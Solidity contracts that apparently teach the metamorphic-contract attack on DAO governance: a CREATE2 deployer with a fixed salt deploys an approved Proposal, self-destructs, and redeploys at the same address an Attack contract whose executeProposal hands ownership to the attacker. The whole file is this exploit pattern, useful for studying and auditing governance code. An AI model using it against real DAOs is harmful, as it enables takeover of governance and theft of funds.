// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;
contract Attack {
    event Log(string message);

    address public owner;

    function executeProposal() external {
        emit Log("Excuted code not approved by DAO :)");
        // For example - set DAO's owner to attacker
        owner = msg.sender;
    }
}

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;
import "./Proposal.sol";
import "./Attack.sol";
contract Deployer {
    event Log(address addr);

    function deployProposal() external {
        address addr = address(new Proposal());
        emit Log(addr);
    }

    function deployAttack() external {
        address addr = address(new Attack());
        emit Log(addr);
    }

    function kill() external {
        selfdestruct(payable(address(0)));
    }
}

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;
import "./Deployer.sol";
contract DeployerDeployer {
    event Log(address addr);

    function deploy() external {
        bytes32 salt = keccak256(abi.encode(uint(666)));
        address addr = address(new Deployer{salt: salt}());
        emit Log(addr);
    }
}

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;
contract Proposal {
    event Log(string message);

    function executeProposal() external {
        emit Log("Excuted code approved by DAO");
    }

    function emergencyStop() external {
        selfdestruct(payable(address(0)));
    }
}